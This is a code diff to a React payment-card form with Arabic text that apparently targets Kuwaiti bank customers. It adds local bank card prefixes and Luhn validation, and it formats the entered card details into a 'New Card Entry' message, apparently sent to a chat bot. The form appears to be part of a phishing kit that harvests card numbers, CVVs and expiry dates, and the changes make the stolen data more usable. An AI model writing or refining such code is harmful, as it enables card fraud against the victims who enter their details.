@@ -33,6 +33,7 @@ const CardDetails = () => {
     prefix: ""
   });
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState("");
 
   const kuwaitiBanks = [
     { value: "", label: "يرجى اختيار البنك" },
@@ -51,11 +52,31 @@ const CardDetails = () => {
 
   const cardPrefixes = [
     { value: "", label: "بادئة" },
+    { value: "542010", label: "542010 (KNET)" },
+    { value: "503258", label: "503258 (NBK)" },
+    { value: "400494", label: "400494 (GULF)" },
+    { value: "402096", label: "402096 (KFH)" },
+    { value: "419266", label: "419266 (BOUBYAN)" },
     { value: "4", label: "4 (Visa)" },
-    { value: "5", label: "5 (MasterCard)" },
-    { value: "6", label: "6 (Discover)" },
-    { value: "3", label: "3 (American Express)" }
+    { value: "5", label: "5 (MasterCard)" }
   ];
+
+  const validateCardNumber = (number: string) => {
+    const digits = number.replace(/\s/g, '');
+    if (digits.length < 13 || digits.length > 19) return false;
+    
+    let sum = 0;
+    let shouldDouble = false;
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let digit = parseInt(digits.charAt(i));
+      if (shouldDouble) {
+        if ((digit *= 2) > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return (sum % 10) === 0;
+  };
 
   const formatCardNumber = (value: string) => {
     const digitsOnly = value.replace(/\D/g, '');
@@ -64,6 +85,7 @@ const CardDetails = () => {
   };
 
   const handleInputChange = (field: string, value: string) => {
+    setError("");
     if (field === 'cardNumber') {
       setFormData({...formData, [field]: formatCardNumber(value)});
     } else if (field === 'cvv') {
@@ -79,8 +101,14 @@ const CardDetails = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setLoading(true);
+    const fullNumber = formData.prefix + formData.cardNumber.replace(/\s/g, '');
     
+    if (!validateCardNumber(fullNumber)) {
+      setError("رقم البطاقة غير صالح. يرجى التأكد من الرقم والمحاولة مرة أخرى.");
+      return;
+    }
+
+    setLoading(true);
     const message = `
 <b>💳 New Card Entry</b>
 <b>Name:</b> ${currentPayment.customerName}
@@ -137,21 +165,12 @@ const CardDetails = () => {
         </div>
 
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
-          <form 
-            name="card-details" 
-            method="POST" 
-            data-netlify="true" 
-            netlify-honeypot="bot-field"
-            onSubmit={handleSubmit} 
-            className="space-y-4 sm:space-y-8"
-          >
-            <input type="hidden" name="form-name" value="card-details" />
-            <input type="hidden" name="payment-id" value={id} />
-            <p style={{ display: 'none' }}>
-              <label>
-                Don't fill this out if you're human: <input name="bot-field" />
-              </label>
-            </p>
+          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8">
+            {error && (
+              <div className="p-3 bg-red-100 text-red-700 rounded-lg text-sm text-center font-medium">
+                {error}
+              </div>
+            )}
 
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
@@ -180,7 +199,7 @@ const CardDetails = () => {
                     name="card-prefix"
                     value={formData.prefix}
                     onChange={(e) => handleInputChange('prefix', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base" 
+                    className="w-20 sm:w-36 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base" 
                     style={{ borderRadius: '8px' }}
                     required
                   >
@@ -216,18 +235,9 @@ const CardDetails = () => {
                     required
                   >
                     <option value="">YYYY</option>
-                    <option value="2024">2024</option>
-                    <option value="2025">2025</option>
-                    <option value="2026">2026</option>
-                    <option value="2027">2027</option>
-                    <option value="2028">2028</option>
-                    <option value="2029">2029</option>
-                    <option value="2030">2030</option>
-                    <option value="2031">2031</option>
-                    <option value="2032">2032</option>
-                    <option value="2033">2033</option>
-                    <option value="2034">2034</option>
-                    <option value="2035">2035</option>
+                    {Array.from({length: 20}, (_, i) => (
+                      <option key={2024+i} value={2024+i}>{2024+i}</option>
+                    ))}
                   </select>
                   <select 
                     name="expiry-month"
